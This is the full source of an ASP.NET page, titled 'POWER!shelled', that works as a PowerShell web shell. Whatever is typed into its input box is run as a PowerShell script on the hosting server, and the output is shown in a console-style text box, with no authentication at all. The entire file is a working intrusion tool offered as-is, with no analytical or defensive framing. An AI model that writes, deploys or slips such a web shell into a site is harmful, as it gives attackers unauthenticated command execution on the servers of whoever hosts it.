<%@ Page Language="C#" %>
<%@ Import Namespace="System.Collections.ObjectModel"%>
<%@ Import Namespace="System.Management.Automation"%>
<%@ Import Namespace="System.Management.Automation.Runspaces"%>
<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>

<!DOCTYPE html>

<script Language="c#" runat="server">

    private static string powershelled(string scriptText)
    {
        try
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(scriptText);
            pipeline.Commands.Add("Out-String");

            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
                stringBuilder.AppendLine(obj.ToString());

            return stringBuilder.ToString();
        }catch(Exception exception)
        {
            return string.Format("Error: {0}", exception.Message);
        }
    }
    
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Page.IsPostBack)
        {
            if(iTBox.Text.Length > 0)
            {
                oTBox.Text = powershelled(iTBox.Text.Trim());
                iTBox.Text = string.Empty;
            }
        }
    }
</script>

<html>
<head id="D34dHead" runat="server">
    <title>POWER!shelled</title>
</head>
<body>
    <form id="form1" runat="server">    
        <span>Index </span>
        <span>POWER!webshell</span>><br />
    <asp:TextBox ID="oTBox" runat="server" BackColor="Black" 
        Height="480px" ReadOnly="True" TextMode="MultiLine" Forecolor="Green"
        Width="1200px" ToolTip="POWER!shell output"></asp:TextBox>
    <br />
    <asp:TextBox ID="iTBox" runat="server" Width="1200px" 
        ToolTip="<POWER!shell command>"></asp:TextBox>
    </form>
</body>
</html>
